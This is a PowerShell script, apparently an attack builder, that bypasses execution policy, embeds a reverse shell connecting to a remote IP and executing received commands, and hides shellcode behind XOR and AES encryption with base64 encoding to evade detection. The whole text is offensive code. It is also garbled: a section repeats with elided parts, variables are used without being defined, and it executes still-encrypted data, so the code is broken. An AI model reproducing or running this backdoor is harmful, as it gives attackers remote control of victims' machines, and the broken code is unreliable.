

# Save the original execution policy
$originalPolicy = Get-ExecutionPolicy

# Temporarily set the execution policy to Bypass
Set-ExecutionPolicy Bypass -Scope Process -Force

# Your reverse shell code goes here (Replace 'YOUR_IP_ADDRESS' and '1234' with your IP and port)
$reverseShellCode = @"
\$ip = "YOUR_IP_ADDRESS"
\$port = 1234

\$client = New-Object System.Net.Sockets.TcpClient(\$ip, \$port)
\$stream = \$client.GetStream()

\$reader = New-Object System.IO.StreamReader(\$stream)
\$writer = New-Object System.IO.StreamWriter(\$stream)

# Run a loop to continuously read and execute commands from the server
while (\$client.Connected) {
    try {
        # Read the command from the server
        \$command = \$reader.ReadLine()

        # Execute the command using PowerShell
        \$output = Invoke-Expression -Command \$command

        # Send the output of the command back to the server
        \$writer.WriteLine(\$output)
        \$writer.Flush()
    } catch {
        # If there's an error, break the loop and close the connection
        break
    }
}

# Close the client connection
\$client.Close()
"@

# Add your reverse shell code to the main script
[Byte[]] \$var1 = 0x31, 0xc0, 0x50, 0x68, 0x2e, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x8b, 0xc4, 0x6a, 0x01,
0x50, 0xbb, 0x7d, 0x1d, 0x80, 0x7c, 0xff, 0xd3, 0x31, 0xc0, 0x50, 0xbb, 0x6b, 0x23, 0x80, 0x7c, 0xff, 0xd3,
0x31, 0xc0, 0x50, 0xbb, 0xe7, 0x79, 0x80, 0x7c, 0xff, 0xd3, 0x31, 0xc0, 0x50, 0x50, 0xbb, 0x8a, 0xca, 0x81,
0x7c, 0xff, 0xd3, 0x31, 0xc0, 0x50, 0xbb, 0x8a, 0xca, 0x81, 0x7c, 0xff, 0xd3, 0x31, 0xc0, 0x50, 0x50, 0xbb,
0x8a, 0xca, 0x81, 0x7c, 0xff, 0xd3, 0x31, 0xc0, 0x50, 0x50, 0x31, 0xc0, 0x31, 0xd2, 0x68, 0x6c, 0x6c, 0x20,
0x48, 0x68, 0x33, 0x32, 0x2e, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x89, 0xe6, 0x50, 0x52, 0x53, 0x50, 0x50,
0x31, 0xd2, 0x31, 0xc0, 0x04, 0x01, 0x50, 0xbb, 0xac, 0xce, 0x81, 0x7c, 0xff, 0xd3

# Perform XOR encoding on the shellcode
\$key = 0xAA
\$encodedShellcode = @()
foreach (\$byte in \$var1) {
    \$encodedByte = \$byte -bxor \$key
    \$encodedShellcode += \$encodedByte
}
# Convert
function Encrypt-String {
    param(
        [string]$PlainText,
        [byte[]]$Key,
        [byte[]]$IV
    )

    $AES = New-Object System.Security.Cryptography.AesManaged
    $AES.Key = $Key
    $AES.IV = $IV
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $Encryptor = $AES.CreateEncryptor()
    $MemoryStream = New-Object System.IO.MemoryStream
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream $MemoryStream, $Encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write

    $StreamWriter = New-Object System.IO.StreamWriter $CryptoStream
    $StreamWriter.Write($PlainText)
    $StreamWriter.Flush()
    $CryptoStream.FlushFinalBlock()
    $MemoryStream.Flush()

    $EncryptedData = $MemoryStream.ToArray()
    $MemoryStream.Dispose()
    $CryptoStream.Dispose()

    return $EncryptedData
}

# Save the original execution policy
$originalPolicy = Get-ExecutionPolicy

# Temporarily set the execution policy to Bypass
Set-ExecutionPolicy Bypass -Scope Process -Force

# Your reverse shell code goes here (Replace 'YOUR_IP_ADDRESS' and '1234' with your IP and port)
$reverseShellCode = @"
\$ip = "YOUR_IP_ADDRESS"
\$port = 1234

# ... (rest of the reverse shell code)
"@

# Add your reverse shell code to the main script
[Byte[]] $var1 = 0x31, 0xc0, 0x50, 0x68, 0x2e, 0x65, 0x78, 0x65, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x8b, 0xc4, 0x6a, 0x01,
# ... (rest of the shellcode)

# Perform XOR encoding on the shellcode (same as before)
# ... (rest of the XOR encoding)

# Convert the encoded shellcode to BASE64 (same as before)
# ... (rest of the BASE64 encoding)

# Replace the 'YOUR_IP_ADDRESS' and '1234' placeholders in the reverse shellcode with actual values
$reverseShellCode = $reverseShellCode -replace 'YOUR_IP_ADDRESS', '192.168.112.129' -replace '1234', '1234'

# Replace the 'BASE64_ENCODED_SHELLCODE' placeholder in the reverse shellcode with the actual BASE64 encoded shellcode
$reverseShellCode = $reverseShellCode -replace 'BASE64_ENCODED_SHELLCODE', $base64EncodedShellcode

# Encrypt the script using AES encryption
$secretKey = [System.Text.Encoding]::UTF8.GetBytes("MySecretKey12345")
$iv = [System.Text.Encoding]::UTF8.GetBytes("InitializationVec")

$encryptedScript = Encrypt-String -PlainText $reverseShellCode -Key $secretKey -IV $iv

# Convert the encrypted script to a BASE64 encoded string
$base64EncryptedScript = [System.Convert]::ToBase64String($encryptedScript)

# Decode the encrypted script back to bytes when needed
$decodedEncryptedScript = [System.Convert]::FromBase64String($base64EncryptedScript)

# Execute the encrypted and encoded script
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decodedEncryptedScript))

# Prevent the script from exiting immediately
for (;;) {
    Start-Sleep 60
    # Add any additional commands you want to execute on the target machine here
}

# Restoring the execution policy to its original value after shellcode execution
Set-ExecutionPolicy -ExecutionPolicy $originalPolicy -Scope Process -Force